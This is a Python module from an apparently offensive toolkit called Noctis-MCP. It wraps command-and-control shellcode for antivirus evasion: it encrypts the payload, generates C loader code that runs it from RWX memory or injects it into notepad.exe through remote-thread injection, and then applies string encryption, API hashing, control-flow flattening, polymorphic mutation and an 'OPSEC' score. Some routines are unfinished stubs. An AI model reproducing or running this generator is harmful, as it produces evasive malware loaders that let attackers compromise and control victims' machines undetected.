"""
Shellcode Wrapper - C2 Integration with Noctis Obfuscation
===========================================================

Wraps C2 framework shellcode with Noctis evasion techniques:
- String encryption
- API hashing
- Control flow obfuscation
- Polymorphic mutations
- OPSEC-aware compilation

Author: Noctis-MCP Team
Phase: 4 - C2 Integration
Sprint: 1 - Base Framework
"""

import os
import sys
import json
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from dataclasses import dataclass

# Add parent directory to path for imports
sys.path.append(str(Path(__file__).parent.parent))

from server.obfuscation.string_encryption import StringEncryptor
from server.obfuscation.api_hashing import APIHasher
from server.obfuscation.control_flow import ControlFlowFlattener
from server.polymorphic.engine import PolymorphicEngine
from server.code_assembler import CodeAssembler
from server.opsec_analyzer import OpsecAnalyzer


@dataclass
class WrapperConfig:
    """Configuration for shellcode wrapping"""
    # Obfuscation options
    encrypt_strings: bool = True
    hash_apis: bool = True
    flatten_control_flow: bool = True
    add_junk_code: bool = True
    apply_polymorphic: bool = True
    
    # Technique integration
    techniques: List[str] = None  # Noctis technique IDs to integrate
    
    # Loader options
    loader_type: str = "direct"  # direct, process_injection, process_hollowing
    injection_target: str = "C:\\Windows\\System32\\notepad.exe"
    
    # Encryption for shellcode
    shellcode_encryption: str = "aes256"  # xor, aes256, rc4
    shellcode_key: Optional[str] = None
    
    # OPSEC options
    check_opsec: bool = True
    min_opsec_score: float = 7.0
    
    def __post_init__(self):
        if self.techniques is None:
            self.techniques = []


class ShellcodeWrapper:
    """
    Wraps C2 shellcode with Noctis obfuscation and evasion techniques
    
    Takes raw shellcode from C2 framework and generates:
    1. Encrypted shellcode payload
    2. Obfuscated loader with evasion techniques
    3. Compiled executable with high OPSEC score
    """
    
    def __init__(self, config: WrapperConfig, verbose: bool = False):
        """
        Initialize shellcode wrapper
        
        Args:
            config: Wrapper configuration
            verbose: Enable verbose logging
        """
        self.config = config
        self.verbose = verbose
        
        # Initialize obfuscation engines
        self.string_encryptor = StringEncryptor()
        self.api_hasher = APIHasher()
        self.control_flow_flattener = ControlFlowFlattener()
        self.polymorphic_engine = PolymorphicEngine()
        self.code_assembler = CodeAssembler()
        self.opsec_analyzer = OpsecAnalyzer()
        
        if verbose:
            print("[*] ShellcodeWrapper initialized")
    
    def encrypt_shellcode(self, shellcode: bytes) -> Tuple[bytes, str]:
        """
        Encrypt shellcode for runtime decryption
        
        Args:
            shellcode: Raw shellcode bytes
            
        Returns:
            (encrypted_shellcode, decryption_key)
        """
        if self.config.shellcode_encryption == "xor":
            key = self.config.shellcode_key or os.urandom(1).hex()
            encrypted = bytes([b ^ int(key, 16) for b in shellcode])
            return encrypted, key
            
        elif self.config.shellcode_encryption == "aes256":
            # AES-256 encryption
            try:
                from Crypto.Cipher import AES
                from Crypto.Random import get_random_bytes
                from Crypto.Util.Padding import pad
                
                key = self.config.shellcode_key or get_random_bytes(32).hex()
                key_bytes = bytes.fromhex(key) if isinstance(key, str) else key
                
                cipher = AES.new(key_bytes[:32], AES.MODE_ECB)
                encrypted = cipher.encrypt(pad(shellcode, AES.block_size))
                return encrypted, key_bytes.hex()
            except ImportError:
                # Fallback to XOR if pycryptodome not available
                if self.verbose:
                    print("[!] pycryptodome not installed, falling back to XOR")
                key = self.config.shellcode_key or os.urandom(1).hex()
                encrypted = bytes([b ^ int(key[:2], 16) for b in shellcode])
                return encrypted, key
            
        elif self.config.shellcode_encryption == "rc4":
            # RC4 encryption (simplified)
            key = self.config.shellcode_key or os.urandom(16).hex()
            # Implement RC4 or use library
            # For now, fallback to XOR
            key_byte = int(key[:2], 16)
            encrypted = bytes([b ^ key_byte for b in shellcode])
            return encrypted, key
        
        # No encryption
        return shellcode, ""
    
    def generate_loader_code(self, 
                            encrypted_shellcode: bytes,
                            decryption_key: str,
                            techniques: List[Dict[str, Any]]) -> str:
        """
        Generate C loader code for shellcode execution
        
        Args:
            encrypted_shellcode: Encrypted shellcode bytes
            decryption_key: Key to decrypt shellcode
            techniques: List of technique implementations to integrate
            
        Returns:
            Complete C source code for loader
        """
        shellcode_array = ', '.join([f'0x{b:02x}' for b in encrypted_shellcode])
        
        # Base loader template
        loader_code = f'''/*
 * Noctis-MCP C2 Beacon Loader
 * Generated with advanced evasion techniques
 */

#include <windows.h>
#include <stdio.h>

// Shellcode payload (encrypted)
unsigned char payload[] = {{ {shellcode_array} }};
unsigned int payload_len = {len(encrypted_shellcode)};

// Decryption key
unsigned char key[] = "{decryption_key}";

// Function declarations
void DecryptPayload(unsigned char* data, unsigned int len);
BOOL ExecuteShellcode(unsigned char* shellcode, unsigned int len);

int main(void) {{
    // Decrypt payload
    DecryptPayload(payload, payload_len);
    
    // Execute shellcode
    if (ExecuteShellcode(payload, payload_len)) {{
        return 0;
    }}
    
    return 1;
}}

void DecryptPayload(unsigned char* data, unsigned int len) {{
'''
        
        # Add decryption routine based on encryption type
        if self.config.shellcode_encryption == "xor":
            loader_code += f'''    unsigned char xor_key = 0x{decryption_key};
    for (unsigned int i = 0; i < len; i++) {{
        data[i] ^= xor_key;
    }}
'''
        elif self.config.shellcode_encryption == "aes256":
            loader_code += '''    // AES-256 decryption
    // TODO: Integrate proper AES decryption
'''
        
        loader_code += '''}

BOOL ExecuteShellcode(unsigned char* shellcode, unsigned int len) {
'''
        
        # Add execution method based on loader type
        if self.config.loader_type == "direct":
            loader_code += '''    // Allocate memory
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        return FALSE;
    }
    
    // Copy shellcode
    memcpy(mem, shellcode, len);
    
    // Execute
    ((void(*)())mem)();
    
    return TRUE;
'''
        elif self.config.loader_type == "process_injection":
            loader_code += f'''    // Process injection into {self.config.injection_target}
    STARTUPINFOA si = {{ sizeof(si) }};
    PROCESS_INFORMATION pi = {{ 0 }};
    
    // Create suspended process
    if (!CreateProcessA(NULL, "{self.config.injection_target}", NULL, NULL, FALSE, 
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {{
        return FALSE;
    }}
    
    // Allocate memory in target process
    LPVOID remote_mem = VirtualAllocEx(pi.hProcess, NULL, len, 
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remote_mem == NULL) {{
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }}
    
    // Write shellcode
    WriteProcessMemory(pi.hProcess, remote_mem, shellcode, len, NULL);
    
    // Create remote thread
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, 
                                        (LPTHREAD_START_ROUTINE)remote_mem, 
                                        NULL, 0, NULL);
    if (hThread == NULL) {{
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }}
    
    // Resume process
    ResumeThread(pi.hThread);
    
    return TRUE;
'''
        
        loader_code += '''}
'''
        
        # Add technique implementations
        if techniques:
            loader_code += '\n// === Integrated Noctis Techniques ===\n'
            for tech in techniques:
                if 'implementation' in tech:
                    loader_code += f"\n// Technique: {tech.get('name', 'Unknown')}\n"
                    loader_code += tech['implementation'] + '\n'
        
        return loader_code
    
    def apply_obfuscation(self, code: str) -> Tuple[str, Dict[str, Any]]:
        """
        Apply all obfuscation techniques to loader code
        
        Args:
            code: Source code to obfuscate
            
        Returns:
            (obfuscated_code, obfuscation_summary)
        """
        summary = {
            'strings_encrypted': 0,
            'apis_hashed': 0,
            'control_flow_flattened': False,
            'junk_code_blocks': 0,
            'polymorphic_applied': False
        }
        
        obfuscated_code = code
        
        # 1. String encryption
        if self.config.encrypt_strings:
            obfuscated_code, decrypt_funcs = self.string_encryptor.encrypt_code(obfuscated_code)
            # Count encrypted strings by counting decryption calls
            encrypted_count = decrypt_funcs.count('decrypt_string_')
            summary['strings_encrypted'] = encrypted_count
            if self.verbose:
                print(f"[+] Encrypted {encrypted_count} strings")
        
        # 2. API hashing
        if self.config.hash_apis:
            obfuscated_code, resolver_funcs = self.api_hasher.obfuscate_code(obfuscated_code)
            # Count hashed APIs by counting hashed entries
            hashed_count = len(self.api_hasher.hashed_apis)
            summary['apis_hashed'] = hashed_count
            if self.verbose:
                print(f"[+] Hashed {hashed_count} API calls")
        
        # 3. Control flow flattening
        if self.config.flatten_control_flow:
            obfuscated_code = self.control_flow_flattener.flatten(obfuscated_code)
            summary['control_flow_flattened'] = True
            if self.verbose:
                print("[+] Flattened control flow")
        
        # 4. Junk code insertion
        if self.config.add_junk_code:
            obfuscated_code, junk_count = self._add_junk_code(obfuscated_code)
            summary['junk_code_blocks'] = junk_count
            if self.verbose:
                print(f"[+] Added {junk_count} junk code blocks")
        
        # 5. Polymorphic mutations
        if self.config.apply_polymorphic:
            obfuscated_code, variant_info = self.polymorphic_engine.generate_variant(obfuscated_code)
            summary['polymorphic_applied'] = True
            summary['variant_info'] = variant_info
            if self.verbose:
                print("[+] Applied polymorphic mutations")
        
        return obfuscated_code, summary
    
    def _add_junk_code(self, code: str) -> Tuple[str, int]:
        """Add junk code blocks (simplified implementation)"""
        # This would integrate with existing junk code generator
        # For now, return unchanged
        return code, 0
    
    def wrap_shellcode(self, 
                      shellcode: bytes,
                      output_path: Optional[str] = None) -> Dict[str, Any]:
        """
        Main method to wrap C2 shellcode with all techniques
        
        Args:
            shellcode: Raw C2 shellcode bytes
            output_path: Path to save wrapped payload
            
        Returns:
            Dictionary with wrapping results
        """
        if self.verbose:
            print(f"[*] Wrapping {len(shellcode)} bytes of shellcode")
        
        # Step 1: Encrypt shellcode
        encrypted_shellcode, decryption_key = self.encrypt_shellcode(shellcode)
        if self.verbose:
            print(f"[+] Encrypted shellcode with {self.config.shellcode_encryption}")
        
        # Step 2: Load technique implementations if specified
        techniques = []
        if self.config.techniques:
            for tech_id in self.config.techniques:
                tech_impl = self._load_technique(tech_id)
                if tech_impl:
                    techniques.append(tech_impl)
        
        # Step 3: Generate loader code
        loader_code = self.generate_loader_code(encrypted_shellcode, decryption_key, techniques)
        if self.verbose:
            print(f"[+] Generated loader code ({len(loader_code)} bytes)")
        
        # Step 4: Apply obfuscation
        obfuscated_code, obf_summary = self.apply_obfuscation(loader_code)
        if self.verbose:
            print(f"[+] Applied obfuscation (code size: {len(obfuscated_code)} bytes)")
        
        # Step 5: OPSEC analysis
        opsec_score = 0.0
        if self.config.check_opsec:
            opsec_report = self.opsec_analyzer.analyze(obfuscated_code)
            opsec_score = opsec_report.overall_score
            if self.verbose:
                print(f"[+] OPSEC Score: {opsec_score}/10")
            
            if opsec_score < self.config.min_opsec_score:
                print(f"[!] Warning: OPSEC score {opsec_score} below minimum {self.config.min_opsec_score}")
        
        # Step 6: Save output
        if output_path:
            Path(output_path).write_text(obfuscated_code)
            if self.verbose:
                print(f"[+] Saved wrapped payload to {output_path}")
        
        return {
            'success': True,
            'original_size': len(shellcode),
            'wrapped_size': len(obfuscated_code),
            'encryption': self.config.shellcode_encryption,
            'loader_type': self.config.loader_type,
            'techniques_applied': self.config.techniques,
            'obfuscation_summary': obf_summary,
            'opsec_score': opsec_score,
            'output_path': output_path
        }
    
    def _load_technique(self, technique_id: str) -> Optional[Dict[str, Any]]:
        """
        Load technique implementation from metadata
        
        Args:
            technique_id: Noctis technique ID (e.g., 'NOCTIS-T124')
            
        Returns:
            Technique metadata with implementation
        """
        # This would integrate with existing technique loader
        # For now, return None
        return None


def wrap_c2_shellcode(shellcode: bytes,
                     config: Optional[WrapperConfig] = None,
                     output_path: Optional[str] = None,
                     verbose: bool = False) -> Dict[str, Any]:
    """
    Convenience function to wrap C2 shellcode
    
    Args:
        shellcode: Raw C2 shellcode bytes
        config: Wrapper configuration (uses defaults if None)
        output_path: Path to save wrapped payload
        verbose: Enable verbose logging
        
    Returns:
        Dictionary with wrapping results
    """
    if config is None:
        config = WrapperConfig()
    
    wrapper = ShellcodeWrapper(config, verbose=verbose)
    return wrapper.wrap_shellcode(shellcode, output_path)

